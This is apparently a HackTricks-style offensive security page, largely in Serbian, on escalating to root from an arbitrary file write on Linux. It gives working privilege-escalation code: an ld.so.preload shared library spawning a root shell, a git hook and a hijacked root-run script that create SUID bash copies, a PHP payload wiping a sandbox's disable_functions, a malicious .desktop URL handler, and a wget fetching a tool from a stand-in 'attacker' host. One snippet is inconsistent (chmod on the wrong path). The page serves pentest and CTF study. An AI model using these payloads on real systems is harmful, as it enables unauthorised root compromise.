# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ovaj fajl se ponaša kao promenljiva okruženja **`LD_PRELOAD`**, ali takođe funkcioniše i u **SUID binaries**.\
Ako možete da ga kreirate ili izmenite, možete jednostavno dodati **putanju do biblioteke koja će biti učitana** pri svakom izvršavanju binarnog fajla.

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) su **skripte** koje se **pokreću** pri raznim **događajima** u git repository-ju kao kada se napravi commit, merge... Dakle, ako **privilegovana skripta ili korisnik** često vrši ove radnje i moguće je **pisati u `.git` folder`**, ovo se može iskoristiti za **privesc**.

Na primer, moguće je **generisati skriptu** u git repo-u u **`.git/hooks`** tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Neki prilagođeni daemoni validiraju PHP koji dostavi korisnik tako što pokreću `php` sa **restricted `php.ini`** (na primer, `disable_functions=exec,system,...`). Ako sandboxovani kod i dalje ima **any write primitive** (kao `file_put_contents`) i možete pristupiti **tačnoj putanji `php.ini`** koju koristi daemon, možete **prepisati tu konfiguraciju** da uklonite restrikcije i zatim poslati drugi payload koji će se izvršiti sa povišenim privilegijama.

Tipičan tok:

1. Prvi payload prepisuje sandbox konfiguraciju.
2. Drugi payload izvršava kod sada kada su opasne funkcije ponovo omogućene.

Minimalni primer (zamenite putanju koju koristi daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ako daemon radi kao root (ili vrši validaciju koristeći putanje u vlasništvu root-a), drugo izvršenje daje root kontekst. Ovo je suštinski **privilege escalation via config overwrite** kada sandboxed runtime i dalje može da piše fajlove.

### binfmt_misc

Fajl koji se nalazi u `/proc/sys/fs/binfmt_misc` pokazuje koji binarni fajl treba da izvrši koji tip fajlova. TODO: proveriti zahteve za zloupotrebu ovoga kako bi se izvršio rev shell kada je uobičajeni tip fajla otvoren.

### Overwrite schema handlers (like http: or https:)

Napadač koji ima prava za pisanje u konfiguracione direktorijume žrtve može lako zameniti ili kreirati fajlove koji menjaju ponašanje sistema, što dovodi do neplaniranog izvršavanja koda. Izmenom fajla `$HOME/.config/mimeapps.list` da postavi HTTP i HTTPS URL handlere na zlonamerni fajl (npr. podešavanjem `x-scheme-handler/http=evil.desktop`), napadač obezbeđuje da **klikom na bilo koji http ili https link bude pokrenut kod naveden u tom `evil.desktop` fajlu**. Na primer, nakon smeštanja sledećeg zlonamernog koda u `evil.desktop` u `$HOME/.local/share/applications`, svaki klik na eksterni URL pokreće ugrađenu komandu:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root izvršava user-writable skripte/binarne fajlove

Ako privilegovani workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binary unutar direktorijuma koji je u vlasništvu neprivilegovanog korisnika), možete ga preuzeti:

- **Detect the execution:** nadgledajte procese pomoću [pspy](https://github.com/DominicBreuker/pspy) da biste uhvatili kada root poziva putanje koje kontroliše korisnik:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potvrdite mogućnost pisanja:** proverite da li su i ciljna datoteka i njen direktorijum u vlasništvu vašeg korisnika i da imaju dozvole za pisanje.
- **Hijack the target:** napravite rezervnu kopiju originalnog binary/script-a i ubacite payload koji kreira SUID shell (ili bilo koju drugu root akciju), zatim vratite dozvole:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokrenite privilegovanu akciju** (npr. pritiskom na UI dugme koje pokreće helper). Kada root ponovo izvrši hijacked path, preuzmite eskaliranu shell sa `./rootshell -p`.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
